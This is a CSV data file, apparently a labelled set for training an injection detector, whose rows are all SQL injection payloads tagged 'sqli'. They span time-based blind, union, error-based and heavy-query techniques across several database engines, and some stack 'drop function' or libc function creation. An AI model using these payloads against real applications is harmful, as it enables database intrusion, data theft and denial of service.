raw_text,label_type
1%')) rlike sleep(5)#,sqli
"1' and 8407=(select count(*) from generate_series(1,5000000)) and 'wytg'='wytg",sqli
"1%' or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli
1%'))) rlike (select (case when (7697=3334) then 1 else 0x28 end)) and ((('%'=',sqli
"1"")) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((""ladc"" like ""ladc",sqli
"1' where 5786=5786 and elt(1210=1210,sleep(5))--",sqli
"1%"");select (case when (9732=7136) then 9732 else 9732*(select 9732 from information_schema.character_sets) end)#",sqli
-7273%')) order by 1#,sqli
-6488' or 5164=9234,sqli
"1 where 2674=2674 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli
-2411 or (8459=8459)*4906# pxwg,sqli
1' or 6793=(select 6793 from pg_sleep(5)) and 'ukoc' like 'ukoc,sqli
"-5170')) as ovbf where 4833=4833 union all select 4833,4833,4833,4833--",sqli
"1')) as kwre where 7775=7775 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli
"(select (case when (4232=4232) then (select benchmark(5000000,md5(0x6b637544))) else 4232*(select 4232 from mysql.db) end))",sqli
1 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli
"1' and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli
"1"")) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli
"1%' union all select null,null,null,null,null,null,null,null,null,null#",sqli
"1%""));iif(5257=5257,1,1/0)",sqli
"1) where 5309=5309 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli
1)) rlike (select (case when (6113=1222) then 1 else 0x28 end)) and ((2815=2815,sqli
"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ('szib' like 'szib",sqli
1' rlike sleep(5) and 'gtfo'='gtfo,sqli
"1"";select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""gjtx"" like ""gjtx",sqli
"1'||(select 'pzoe' where 2977=2977 and elt(3114=3114,sleep(5))#",sqli
"1 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)-- jpqa",sqli
"1""));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((""eevk""=""eevk",sqli
"-7433"")) as zsnt where 2513=2513 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli
-2361')) as mzhv where 2905=2905 or 9026=5388--,sqli
"1' or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'eqyr' like 'eqyr",sqli
"1'||(select 'rawn' from dual where 4988=4988 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))||'",sqli
"1""))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((""prhp""=""prhp",sqli
-6616) order by 1--,sqli
"-5158')) or make_set(9354=9354,7185) and (('noaj' like 'noaj",sqli
-2781))) or 2573=5848--,sqli
"-3116)) as jyiq where 3875=3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",sqli
"-4889"")) as vvuo where 8060=8060 or (8459=8459)*4906--",sqli
"1')));select * from generate_series(9709,9709,case when (9709=7795) then 1 else 0 end) limit 1--",sqli
1'||(select 'sliy' where 9494=9494;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli
"1%""));select (case when (6047=8897) then 6047 else 6047*(select 6047 from information_schema.character_sets) end)#",sqli
1)) and 3249=2985,sqli
"1"")) as aozi where 3354=3354 waitfor delay '0:0:5'--",sqli
-6218')) or 2236=4469#,sqli
1) as iknl where 3885=3885 rlike sleep(5)#,sqli
"1)) as fwru where 5262=5262 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli
"1"" and (select * from (select(sleep(5)))fzno)",sqli
-7444))) or 1342=9774,sqli
"-6611%""))) union all select 8918,8918#",sqli
"1') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli
"1"") as evoq where 8193=8193 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli
"1)) as tbiq where 7159=7159 and 8635=(select count(*) from generate_series(1,5000000))--",sqli
"1')) and make_set(1002=3556,3556) and (('mfao'='mfao",sqli
"1)) as vryv where 5600=5600;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli
"1"" and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli
"1%""));select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli
1'));if(5896=4251) select 5896 else drop function xmyk--,sqli
"1)));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((9348=9348",sqli
1 or 6793=(select 6793 from pg_sleep(5)),sqli
"1%"") union all select null,null,null,null,null,null,null,null,null--",sqli
1' where 3900=3900 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,sqli
"1%'))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli
-8463))) or 4861=9834#,sqli
"1) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",sqli
1' where 6035=6035 waitfor delay '0:0:5'--,sqli
"1"")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((""uquh""=""uquh",sqli
"-9987))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((2114=2114",sqli
"1%"" and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ""%""=""",sqli
"1%') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('%'='",sqli
1') as njfg where 6392=6392 waitfor delay '0:0:5'--,sqli
"-6747"" or 9323=9323#",sqli
"1) as xuvz where 3061=3061 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli
"1,(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(8979,8979,case when (8979=8979) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",sqli
-6518')) as vocx where 2539=2539 or (8652=2025)*2025--,sqli
"1""))) and elt(4249=4249,7259) and (((""vhmc""=""vhmc",sqli
"1' in boolean mode) union all select null,null,null--",sqli
"1') as rvli where 4427=4427;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('bemh'='bemh",sqli
"1%') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('%'='",sqli
"1' or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'nepn'='nepn",sqli
"-7146"" where 6431=6431 or 8548=5549--",sqli
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'gkku' like 'gkku",sqli
"1') and 2388=benchmark(5000000,md5(0x6d457153))#",sqli
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",sqli
"1' where 8128=8128;select * from generate_series(2317,2317,case when (2317=9706) then 1 else 0 end) limit 1--",sqli
"-5520"")) as utqk where 7762=7762 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli
"-9432)) as nqya where 8387=8387 or elt(9242=6180,6180)--",sqli
"1'||(select 'bmyt' from dual where 9407=9407 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",sqli
1' and 6969=(select 6969 from pg_sleep(5)) and 'zoin'='zoin,sqli
"1%""))) and 8438=7620--",sqli
"1%')) union all select null,null,null,null,null,null,null,null,null,null#",sqli
"1"")) as wnzf where 3352=3352 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli
"1"")) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""pyfz"" like ""pyfz",sqli
1'))) or sleep(5) and ((('ecur'='ecur,sqli
"1)) as nwyh where 7100=7100;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli
"-7543'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli
"1%"") union all select null,null,null,null,null,null--",sqli
"1'))) and elt(3114=3114,sleep(5))#",sqli
"1""))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((""fpkm"" like ""fpkm",sqli
-2372' or 1783=2656,sqli
1) as nbno where 9816=9816 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli
"-3725')) union all select 1541,1541,1541,1541,1541#",sqli
"1"")) as nlgn where 3834=3834 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli
"1"")) as tybm where 2687=2687 or elt(5873=5873,sleep(5))#",sqli
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli
"1'||(select 'svbf' where 7017=7017 or elt(6272=6272,sleep(5)))||'",sqli
"1"") as rovd where 3764=3764 and elt(4249=4249,7259)--",sqli
"1'||(select 'wyng' from dual where 2157=2157 union all select null,null--",sqli
"-3604') as fyev where 7259=7259 union all select 7259,7259,7259,7259--",sqli
"1',(select (case when (6894=6087) then 1 else 6894*(select 6894 from information_schema.character_sets) end))",sqli
"-6000"") where 1797=1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--",sqli
"1"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ""lxfm""=""lxfm",sqli
"1)) as vzso where 8541=8541 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli
"1')) as egsj where 3447=3447;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli
1'))) and (3020=3020)*6703 and ((('nhrc' like 'nhrc,sqli
"1'+(select idnb where 2338=2338;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)+'",sqli
-4331) as inpx where 9804=9804 union all select 9804#,sqli
"1"" where 9173=9173 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",sqli
1')) as xqvq where 4816=4816 or 4240=(select 4240 from pg_sleep(5))--,sqli
"1') where 3450=3450 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli
1%')) and 8594=(select 8594 from pg_sleep(5))--,sqli
1)));waitfor delay '0:0:5'--,sqli
"1',(select (case when (3888=3888) then (select count(*) from generate_series(1,5000000)) else 1/(select 0) end))",sqli
"1"");select * from generate_series(9434,9434,case when (9434=3991) then 1 else 0 end) limit 1--",sqli
"1') as jysm where 8961=8961 union all select null,null#",sqli
"1'))) union all select null,null,null,null,null,null,null,null#",sqli
"1"") rlike sleep(5) and (""efoq"" like ""efoq",sqli
1%'))) or sleep(5) and ((('%'=',sqli
"1"") where 1330=1330 or (select * from (select(sleep(5)))ydpu)--",sqli
"1') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('xzlx' like 'xzlx",sqli
-7535) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli
"1') where 1323=1323 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli
"1%')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('%'='",sqli
"1') where 6248=6248 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli
"-1868"") where 9495=9495 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli
1wwis,sqli
1') and sleep(5) and ('njud'='njud,sqli
"1"") as lkzz where 3565=3565 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli
"1"")) as eglv where 7412=7412 union all select null#",sqli
"-8432) union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",sqli
"1%"") or 6793=(select 6793 from pg_sleep(5)) and (""%""=""",sqli
"1%""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""%""=""",sqli
"-5644""))) or make_set(9354=9354,7185) and (((""evcf""=""evcf",sqli
"1%"") and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli
"(select 2*(if((select * from (select concat(0x7171706a71,(select (elt(6130=6130,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",sqli
"1) as vqbf where 4020=4020;select benchmark(5000000,md5(0x4c4d6142))--",sqli
1'+(select qpaf where 7859=7859 or (select * from (select(sleep(5)))ydpu))+',sqli
"1' and make_set(4952=7129,7129)",sqli
"1"")) as paep where 8947=8947 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli
"1%"");select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli
"-9183"") as wctu where 2058=2058 or 3038=3038",sqli
"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('xuwl' like 'xuwl",sqli
1'+(select lptb where 3861=3861 or sleep(5))+',sqli
1' where 2911=2911;if(7899=7899) select 7899 else drop function zbbp--,sqli
1%'));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli
"1"") where 1107=1107 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli
"1"") or elt(6272=6272,sleep(5)) and (""fvrq""=""fvrq",sqli
"1'+(select 'asdq' where 4023=4023 and make_set(8403=8403,8899))+'",sqli
"1'));iif(8213=4718,1,1/0)",sqli
"1%' and 3824=benchmark(5000000,md5(0x76555642)) and '%'='",sqli
"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",sqli
"1%"")) or (select * from (select(sleep(5)))sddo)#",sqli
"1'||(select 'ltqo' where 9080=9080 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",sqli
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('oskf' like 'oskf",sqli
"1 where 4949=4949;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli
"1"")) as wugz where 5355=5355 and 3824=benchmark(5000000,md5(0x76555642))--",sqli
1 where 1931=1931 and sleep(5)--,sqli
"1) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",sqli
"1')) as nuku where 7009=7009 union all select null,null,null,null,null#",sqli
1 where 6494=6494 and 8463=2760,sqli
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4-- sapi",sqli
"-6987' union all select 4721,4721--",sqli
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'pbin'='pbin",sqli
-5062) where 7457=7457 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli
"1'+(select 'gjaq' where 5449=5449 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))+'",sqli
1'||(select 'dfmw' from dual where 1723=1723;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli
"1"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""rvub"" like ""rvub",sqli
"1%"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli
"1"") and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli
"1' in boolean mode) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)#",sqli
"1%"")) and 6283=2068 and ((""%""=""",sqli
"1 union all select null,null,null--",sqli
"1%"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ""%""=""",sqli
"-8521') union all select 2446,2446,2446,2446,2446,2446,2446#",sqli
"1)));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli
-8922 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')-- krmh,sqli
"1"";select * from generate_series(3551,3551,case when (3551=6451) then 1 else 0 end) limit 1--",sqli
"-5703') or elt(2972=8708,8708)",sqli
"1%"")));begin dbms_lock.sleep(5); end and (((""%""=""",sqli
"1'||(select 'cjwx' from dual where 7637=7637 and elt(9548=3991,3991))||'",sqli
1') where 2974=2974 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli
1)) and (3020=3020)*6703 and ((3078=3078,sqli
"1%"" and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli
"1') where 8586=8586 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli
1'))) or 6793=(select 6793 from pg_sleep(5)) and ((('ugrk'='ugrk,sqli
"1%""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli
"1%'))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli
"-8358'))) union all select 7282,7282--",sqli
"1%')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('%'='",sqli
"1"")));select sleep(5) and (((""wucy"" like ""wucy",sqli
"1%' and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli
"-6184"")) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""rovr""=""rovr",sqli
"1%"" and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli
-5291')) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('tmpm'='tmpm,sqli
"1"";select case when 1238=9044 then 1 else null end--",sqli
"1"")) as bosq where 4695=4695;select benchmark(5000000,md5(0x714e4153))#",sqli
"1"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""zzkc""=""zzkc",sqli
"1;select benchmark(5000000,md5(0x4c4d6142))",sqli
1' where 2547=2547 and 6969=(select 6969 from pg_sleep(5))--,sqli
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('xngr'='xngr",sqli
"1"" where 3484=3484 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli
1%'));begin dbms_lock.sleep(5); end and (('%'=',sqli
1') as xwlf where 9424=9424;(select * from (select(sleep(5)))acdk)#,sqli
"1"" and 6969=(select 6969 from pg_sleep(5)) and ""ojpe"" like ""ojpe",sqli
"1') and elt(1210=1210,sleep(5))",sqli
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('iixp'='iixp",sqli
"1"") where 1699=1699 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli
1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('cuav'='cuav,sqli
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('ireg' like 'ireg",sqli
"1%"") and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""",sqli
1' in boolean mode) union all select null#,sqli
1%');select sleep(5) and ('%'=',sqli
"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",sqli
1;(select * from (select(sleep(5)))acdk)#,sqli
1'||(select 'xugb' from dual where 6772=6772;if(7899=7899) select 7899 else drop function zbbp--,sqli
"-8667'+(select ymmg where 6132=6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132#",sqli
"-9096"") where 9452=9452 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli
"-9526 where 5734=5734 or elt(1032=1032,3623)--",sqli
"1) where 1415=1415 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli
"1""))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli
"-1000"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""isbq""=""isbq",sqli
"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and 'jmub'='jmub",sqli
"1%"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""%""=""",sqli
"1 where 9404=9404;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli
"-4325' or make_set(9354=9354,7185)",sqli
"1' in boolean mode) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))#",sqli
"-3794') union all select 2485,2485,2485,2485,2485--",sqli
1)) as jvvs where 9594=9594;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli
"1,(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4250=4250) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)",sqli
"1%')) union all select null,null#",sqli
1'))) and (select * from (select(sleep(5)))gcrr)#,sqli
"1'));select count(*) from generate_series(1,5000000)--",sqli
"-1816"") or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""dztr"" like ""dztr",sqli
"1%""));select (case when (9393=5530) then 9393 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli
"1"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""cuzi"" like ""cuzi",sqli
"1' where 9206=9206;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli
1'))) union all select null--,sqli
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('lwyo'='lwyo",sqli
"1"")));iif(5257=5257,1,1/0)",sqli
1'+(select 'xpby' where 2724=2724;select (case when (9376=4521) then 1 else 9376*(select 9376 from master..sysdatabases) end)--,sqli
"1));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((7749=7749",sqli
"1%""))) and sleep(5) and (((""%""=""",sqli
"1"" where 8333=8333;select pg_sleep(5)--",sqli
"1 where 3744=3744;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli
"-9456%"")) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((""%""=""",sqli
"1'||(select 'svgd' from dual where 5188=5188 union all select null,null,null,null,null#",sqli
"1%""));(select * from (select(sleep(5)))srmq) and ((""%""=""",sqli
"1%"";select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli
1%');select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli
1'))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((('snoa'='snoa,sqli
-1641' union all select 4835#,sqli
"1) as bfuy where 3879=3879 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli
"1' and make_set(8403=8403,8899) and 'niux'='niux",sqli
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('nczi'='nczi",sqli
"1"") where 2496=2496;select * from generate_series(7667,7667,case when (7667=8232) then 1 else 0 end) limit 1--",sqli
"1') as wjty where 2971=2971;select benchmark(5000000,md5(0x714e4153))#",sqli
"-2197' union all select 8065,8065,8065,8065--",sqli
